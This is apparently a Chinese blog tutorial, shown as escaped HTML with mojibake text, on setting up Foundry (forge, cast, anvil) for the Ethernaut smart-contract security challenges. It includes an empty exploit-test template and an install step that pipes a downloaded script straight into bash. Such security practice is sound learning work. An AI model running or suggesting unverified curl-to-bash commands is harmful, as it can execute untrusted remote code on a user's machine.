class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># æŸ¥è¯¢åŒºå—é“¾ä¿¡æ¯</span></span><br><span class=\"line\">cast block-number             <span class=\"comment\"># è·å–æœ€æ–°åŒºå—å·</span></span><br><span class=\"line\">cast balance &lt;address&gt;        <span class=\"comment\"># æŸ¥è¯¢åœ°å€ä½™é¢</span></span><br><span class=\"line\">cast storage &lt;address&gt; &lt;slot&gt; <span class=\"comment\"># è¯»å–å­˜å‚¨æ§½</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è°ƒç”¨åˆçº¦</span></span><br><span class=\"line\">cast call &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># åªè¯»è°ƒç”¨</span></span><br><span class=\"line\">cast send &lt;address&gt; &lt;signature&gt; [args]  <span class=\"comment\"># çŠ¶æ€å˜æ›´è°ƒç”¨</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å·¥å…·å‡½æ•°</span></span><br><span class=\"line\">cast keccak <span class=\"string\">&quot;function_signature()&quot;</span>      <span class=\"comment\"># è®¡ç®—å‡½æ•°é€‰æ‹©å™¨</span></span><br><span class=\"line\">cast abi-encode <span class=\"string\">&quot;func(uint256)&quot;</span> 123     <span class=\"comment\"># ABI ç¼–ç </span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Anvil-å‘½ä»¤\"><a href=\"#Anvil-å‘½ä»¤\" class=\"headerlink\" title=\"Anvil å‘½ä»¤\"></a>Anvil å‘½ä»¤</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¯åŠ¨æœ¬åœ°æµ‹è¯•ç½‘</span></span><br><span class=\"line\">anvil                         <span class=\"comment\"># é»˜è®¤é…ç½®</span></span><br><span class=\"line\">anvil --port 8545            <span class=\"comment\"># æŒ‡å®šç«¯å£</span></span><br><span class=\"line\">anvil --accounts 20          <span class=\"comment\"># æŒ‡å®šè´¦æˆ·æ•°é‡</span></span><br><span class=\"line\">anvil --balance 1000         <span class=\"comment\"># æ¯ä¸ªè´¦æˆ·åˆå§‹ä½™é¢ (ETH)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä»ç‰¹å®šçŠ¶æ€åˆ†å‰</span></span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth</span><br><span class=\"line\">anvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-Ethernaut-ä¸“ç”¨é…ç½®\"><a href=\"#ğŸ¯-Ethernaut-ä¸“ç”¨é…ç½®\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®\"></a>ğŸ¯ Ethernaut ä¸“ç”¨é…ç½®</h2><h3 id=\"ç¯å¢ƒå˜é‡é…ç½®\"><a href=\"#ç¯å¢ƒå˜é‡é…ç½®\" class=\"headerlink\" title=\"ç¯å¢ƒå˜é‡é…ç½®\"></a>ç¯å¢ƒå˜é‡é…ç½®</h3><p>åˆ›å»º <code>.env</code> æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># .env æ–‡ä»¶</span></span><br><span class=\"line\">ETHERSCAN_API_KEY=your_etherscan_api_key</span><br><span class=\"line\">MAINNET_RPC_URL=https://rpc.ankr.com/eth</span><br><span class=\"line\">SEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia</span><br><span class=\"line\">PRIVATE_KEY=your_private_key_for_testing</span><br></pre></td></tr></table></figure>\n\n<p>åŠ è½½ç¯å¢ƒå˜é‡ï¼š</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># åœ¨ shell ä¸­åŠ è½½</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> .<span class=\"built_in\">env</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æˆ–åœ¨ foundry.toml ä¸­é…ç½®è‡ªåŠ¨åŠ è½½</span></span><br><span class=\"line\">[profile.default]</span><br><span class=\"line\">env_file = <span class=\"string\">&quot;.env&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æµ‹è¯•æ¨¡æ¿\"><a href=\"#æµ‹è¯•æ¨¡æ¿\" class=\"headerlink\" title=\"æµ‹è¯•æ¨¡æ¿\"></a>æµ‹è¯•æ¨¡æ¿</h3><p>åˆ›å»ºæ ‡å‡†æµ‹è¯•æ–‡ä»¶æ¨¡æ¿ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/TargetContract.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TargetContractTest is Test &#123;</span><br><span class=\"line\">    TargetContract public instance;</span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        instance = new TargetContract();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åˆå§‹åŒ–æ”»å‡»è€…è´¦æˆ·</span><br><span class=\"line\">        vm.deal(attacker, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testExploit() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»é€»è¾‘</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertTrue(/* éªŒè¯æ¡ä»¶ */);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›-å¸¸è§é—®é¢˜è§£å†³\"><a href=\"#ğŸ›-å¸¸è§é—®é¢˜è§£å†³\" class=\"headerlink\" title=\"ğŸ› å¸¸è§é—®é¢˜è§£å†³\"></a>ğŸ› å¸¸è§é—®é¢˜è§£å†³</h2><h3 id=\"ç¼–è¯‘é”™è¯¯\"><a href=\"#ç¼–è¯‘é”™è¯¯\" class=\"headerlink\" title=\"ç¼–è¯‘é”™è¯¯\"></a>ç¼–è¯‘é”™è¯¯</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># æ¸…ç†å¹¶é‡æ–°ç¼–è¯‘</span></span><br><span class=\"line\">forge clean &amp;&amp; forge build</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ Solidity ç‰ˆæœ¬å…¼å®¹æ€§</span></span><br><span class=\"line\">forge build --force</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹è¯¦ç»†é”™è¯¯ä¿¡æ¯</span></span><br><span class=\"line\">forge build --verbose</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä¾èµ–é—®é¢˜\"><a href=\"#ä¾èµ–é—®é¢˜\" class=\"headerlink\" title=\"ä¾èµ–é—®é¢˜\"></a>ä¾èµ–é—®é¢˜</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é‡æ–°å®‰è£…ä¾èµ–</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf lib/</span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ Git å­æ¨¡å—çŠ¶æ€</span></span><br><span class=\"line\">git submodule status</span><br><span class=\"line\">git submodule update --init --recursive</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æµ‹è¯•å¤±è´¥\"><a href=\"#æµ‹è¯•å¤±è´¥\" class=\"headerlink\" title=\"æµ‹è¯•å¤±è´¥\"></a>æµ‹è¯•å¤±è´¥</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¢åŠ è¯¦ç»†è¾“å‡º</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> -vvvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨è°ƒè¯•å™¨</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --debug &lt;test_function&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ gas ä½¿ç”¨æƒ…å†µ</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-è¿›é˜¶é…ç½®\"><a href=\"#ğŸ“š-è¿›é˜¶é…ç½®\" class=\"headerlink\" title=\"ğŸ“š è¿›é˜¶é…ç½®\"></a>ğŸ“š è¿›é˜¶é…ç½®</h2><h3 id=\"å¤šç‰ˆæœ¬-Solidity-æ”¯æŒ\"><a href=\"#å¤šç‰ˆæœ¬-Solidity-æ”¯æŒ\" class=\"headerlink\" title=\"å¤šç‰ˆæœ¬ Solidity æ”¯æŒ\"></a>å¤šç‰ˆæœ¬ Solidity æ”¯æŒ</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># foundry.toml</span></span><br><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.legacy]</span></span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.6.12&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è‡ªå®šä¹‰æµ‹è¯•é…ç½®\"><a href=\"#è‡ªå®šä¹‰æµ‹è¯•é…ç½®\" class=\"headerlink\" title=\"è‡ªå®šä¹‰æµ‹è¯•é…ç½®\"></a>è‡ªå®šä¹‰æµ‹è¯•é…ç½®</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.fuzz]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">max_test_rejects</span> = <span class=\"number\">65536</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.invariant]</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"attr\">depth</span> = <span class=\"number\">32</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-ä¼˜åŒ–è®¾ç½®\"><a href=\"#Gas-ä¼˜åŒ–è®¾ç½®\" class=\"headerlink\" title=\"Gas ä¼˜åŒ–è®¾ç½®\"></a>Gas ä¼˜åŒ–è®¾ç½®</h3><figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default.optimizer]</span></span><br><span class=\"line\"><span class=\"attr\">enabled</span> = <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">runs</span> = <span class=\"number\">200</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[profile.default.model_checker]</span></span><br><span class=\"line\"><span class=\"attr\">contracts</span> = &#123; <span class=\"string\">&quot;/path/to/project/src/Contract.sol&quot;</span> = [ <span class=\"string\">&quot;Contract&quot;</span> ] &#125;</span><br><span class=\"line\"><span class=\"attr\">engine</span> = <span class=\"string\">&quot;chc&quot;</span></span><br><span class=\"line\"><span class=\"attr\">targets</span> = [ <span class=\"string\">&quot;assert&quot;</span>, <span class=\"string\">&quot;underflow&quot;</span>, <span class=\"string\">&quot;overflow&quot;</span>, <span class=\"string\">&quot;divByZero&quot;</span> ]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“-æ€»ç»“\"><a href=\"#ğŸ“-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ“ æ€»ç»“\"></a>ğŸ“ æ€»ç»“</h2><p>ç°åœ¨æ‚¨å·²ç»å®Œæˆäº† Foundry å¼€å‘ç¯å¢ƒçš„æ­å»ºï¼Œå¯ä»¥å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜çš„å­¦ä¹ ä¹‹æ—…äº†ï¼</p>\n<h3 id=\"ä¸‹ä¸€æ­¥ï¼š\"><a href=\"#ä¸‹ä¸€æ­¥ï¼š\" class=\"headerlink\" title=\"ä¸‹ä¸€æ­¥ï¼š\"></a>ä¸‹ä¸€æ­¥ï¼š</h3><ol>\n<li><strong>ç†Ÿæ‚‰ Foundry åŸºæœ¬å‘½ä»¤</strong></li>\n<li><strong>è¿è¡Œç¬¬ä¸€ä¸ªæµ‹è¯•</strong>: <code>forge test --match-contract FallbackTest -vvv</code></li>\n<li><strong>å¼€å§‹å­¦ä¹ </strong>: <a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1 - Fallback</a></li>\n</ol>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"https://book.getfoundry.sh/\">Foundry å®˜æ–¹æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://github.com/foundry-rs/foundry\">Foundry GitHub</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">ä¸‹ä¸€ç¯‡: Level 1 - Fallback</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n</ul>\n<hr>\n<p><em>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚æŒæ¡å¥½å·¥å…·ï¼Œæ‰èƒ½æ›´å¥½åœ°å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨ã€‚</em> ğŸ”§</p>\n","more":"<h1 id=\"ğŸ› ï¸-Foundry-ç¯å¢ƒæ­å»ºä¸-Ethernaut-é¡¹ç›®é…ç½®\"><a href=\"#ğŸ› ï¸-Foundry-ç¯å¢ƒæ­å»ºä¸-Ethernaut-é¡¹ç›®é…ç½®\" class=\"headerlink\" title=\"ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®\"></a>ğŸ› ï¸ Foundry ç¯å¢ƒæ­å»ºä¸ Ethernaut é¡¹ç›®é…ç½®</h1><blockquote>\n<p>åœ¨å¼€å§‹ Ethernaut å®‰å…¨æŒ‘æˆ˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªå®Œæ•´çš„ Foundry å¼€å‘ç¯å¢ƒã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»ä»é›¶å¼€å§‹çš„å®Œæ•´é…ç½®æµç¨‹ã€‚</p>\n</blockquote>\n<h2 id=\"ğŸ“š-ä»€ä¹ˆæ˜¯-Foundry\"><a href=\"#ğŸ“š-ä»€ä¹ˆæ˜¯-Foundry\" class=\"headerlink\" title=\"ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?\"></a>ğŸ“š ä»€ä¹ˆæ˜¯ Foundry?</h2><p><strong>Foundry</strong> æ˜¯ä¸€ä¸ªç”¨ Rust ç¼–å†™çš„å¿«é€Ÿã€å¯ç§»æ¤å’Œæ¨¡å—åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·åŒ…ï¼ŒåŒ…å«ï¼š</p>\n<ul>\n<li><strong>Forge</strong>: æµ‹è¯•æ¡†æ¶</li>\n<li><strong>Cast</strong>: ç‘å£«å†›åˆ€èˆ¬çš„ RPC å·¥å…·</li>\n<li><strong>Anvil</strong>: æœ¬åœ°æµ‹è¯•ç½‘ç»œ</li>\n<li><strong>Chisel</strong>: Solidity REPL</li>\n</ul>\n<h3 id=\"ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\"><a href=\"#ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\" class=\"headerlink\" title=\"ä¸å…¶ä»–å·¥å…·å¯¹æ¯”\"></a>ä¸å…¶ä»–å·¥å…·å¯¹æ¯”</h3><table>\n<thead>\n<tr>\n<th>å·¥å…·</th>\n<th>è¯­è¨€</th>\n<th>æµ‹è¯•é€Ÿåº¦</th>\n<th>é…ç½®å¤æ‚åº¦</th>\n<th>ç¤¾åŒºæ”¯æŒ</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Foundry</strong></td>\n<td>Rust</td>\n<td>â­â­â­â­â­</td>\n<td>â­â­â˜†â˜†â˜†</td>\n<td>â­â­â­â­â˜†</td>\n</tr>\n<tr>\n<td>Hardhat</td>\n<td>JavaScript</td>\n<td>â­â­â­â˜†â˜†</td>\n<td>â­â­â­â˜†â˜†</td>\n<td>â­â­â­â­â­</td>\n</tr>\n<tr>\n<td>Truffle</td>\n<td>JavaScript</td>\n<td>â­â­â˜†â˜†â˜†</td>\n<td>â­â­â­â­â˜†</td>\n<td>â­â­â­â˜†â˜†</td>\n</tr>\n</tbody></table>\n<h2 id=\"ğŸš€-Foundry-å®‰è£…\"><a href=\"#ğŸš€-Foundry-å®‰è£…\" class=\"headerlink\" title=\"ğŸš€ Foundry å®‰è£…\"></a>ğŸš€ Foundry å®‰è£…</h2><h3 id=\"æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Foundryup-æ¨è\"><a href=\"#æ–¹æ³•ä¸€ï¼šä½¿ç”¨-Foundryup-æ¨è\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)\"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Foundryup (æ¨è)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä¸‹è½½å¹¶å®‰è£… Foundryup</span></span><br><span class=\"line\">curl -L https://foundry.paradigm.xyz | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é‡æ–°åŠ è½½ shell æˆ–é‡å¯ç»ˆç«¯</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc  <span class=\"comment\"># æˆ– source ~/.zshrc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Foundry</span></span><br><span class=\"line\">foundryup</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># éªŒè¯å®‰è£…</span></span><br><span class=\"line\">forge --version</span><br><span class=\"line\">cast --version</span><br><span class=\"line\">anvil --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\"><a href=\"#æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\" class=\"headerlink\" title=\"æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘\"></a>æ–¹æ³•äºŒï¼šä»æºç ç¼–è¯‘</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš† Foundry ä»“åº“</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/foundry-rs/foundry</span><br><span class=\"line\"><span class=\"built_in\">cd</span> foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ç¼–è¯‘å®‰è£… (éœ€è¦ Rust ç¯å¢ƒ)</span></span><br><span class=\"line\">cargo build --release</span><br><span class=\"line\">cargo install --path ./crates/forge --bin forge</span><br><span class=\"line\">cargo install --path ./crates/cast --bin cast</span><br><span class=\"line\">cargo install --path ./crates/anvil --bin anvil</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\"><a href=\"#æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\" class=\"headerlink\" title=\"æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨\"></a>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨åŒ…ç®¡ç†å™¨</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># macOS (Homebrew)</span></span><br><span class=\"line\">brew install foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Ubuntu/Debian (éœ€è¦æ·»åŠ  PPA)</span></span><br><span class=\"line\"><span class=\"comment\"># æš‚ä¸æ”¯æŒï¼Œå»ºè®®ä½¿ç”¨æ–¹æ³•ä¸€</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Windows (éœ€è¦ WSL)</span></span><br><span class=\"line\"><span class=\"comment\"># åœ¨ WSL ä¸­æ‰§è¡Œæ–¹æ³•ä¸€çš„æ­¥éª¤</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“-Ethernaut-é¡¹ç›®ç»“æ„\"><a href=\"#ğŸ“-Ethernaut-é¡¹ç›®ç»“æ„\" class=\"headerlink\" title=\"ğŸ“ Ethernaut é¡¹ç›®ç»“æ„\"></a>ğŸ“ Ethernaut é¡¹ç›®ç»“æ„</h2><h3 id=\"å…‹éš†é¡¹ç›®\"><a href=\"#å…‹éš†é¡¹ç›®\" class=\"headerlink\" title=\"å…‹éš†é¡¹ç›®\"></a>å…‹éš†é¡¹ç›®</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å…‹éš† Ethernaut Foundry Solutions é¡¹ç›®</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æŸ¥çœ‹é¡¹ç›®ç»“æ„</span></span><br><span class=\"line\">tree -L 2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"é¡¹ç›®ç›®å½•ç»“æ„\"><a href=\"#é¡¹ç›®ç›®å½•ç»“æ„\" class=\"headerlink\" title=\"é¡¹ç›®ç›®å½•ç»“æ„\"></a>é¡¹ç›®ç›®å½•ç»“æ„</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Ethernaut-Foundry-Solutions/</span><br><span class=\"line\">â”œâ”€â”€ foundry.toml          # Foundry é…ç½®æ–‡ä»¶</span><br><span class=\"line\">â”œâ”€â”€ .gitmodules          # Git å­æ¨¡å—é…ç½®</span><br><span class=\"line\">â”œâ”€â”€ README.md            # é¡¹ç›®è¯´æ˜</span><br><span class=\"line\">â”œâ”€â”€ lib/                 # ä¾èµ–åº“</span><br><span class=\"line\">â”‚   â”œâ”€â”€ forge-std/       # Foundry æ ‡å‡†åº“</span><br><span class=\"line\">â”‚   â””â”€â”€ openzeppelin-contracts/  # OpenZeppelin åˆçº¦åº“</span><br><span class=\"line\">â”œâ”€â”€ src/                 # æºç ç›®å½•</span><br><span class=\"line\">â”‚   â”œâ”€â”€ Fallback.sol     # å…³å¡åŸå§‹åˆçº¦</span><br><span class=\"line\">â”‚   â”œâ”€â”€ Fallout.sol</span><br><span class=\"line\">â”‚   â””â”€â”€ ...</span><br><span class=\"line\">â”œâ”€â”€ test/                # æµ‹è¯•ç›®å½•</span><br><span class=\"line\">â”‚   â”œâ”€â”€ FallbackTest.sol # æ”»å‡»æµ‹è¯•åˆçº¦</span><br><span class=\"line\">â”‚   â”œâ”€â”€ FalloutTest.sol</span><br><span class=\"line\">â”‚   â””â”€â”€ ...</span><br><span class=\"line\">â”œâ”€â”€ script/              # éƒ¨ç½²è„šæœ¬</span><br><span class=\"line\">â””â”€â”€ solutions/           # è§£é¢˜è¯´æ˜æ–‡æ¡£</span><br><span class=\"line\">    â”œâ”€â”€ 01_Fallback_zh.md</span><br><span class=\"line\">    â””â”€â”€ ...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"âš™ï¸-é¡¹ç›®é…ç½®\"><a href=\"#âš™ï¸-é¡¹ç›®é…ç½®\" class=\"headerlink\" title=\"âš™ï¸ 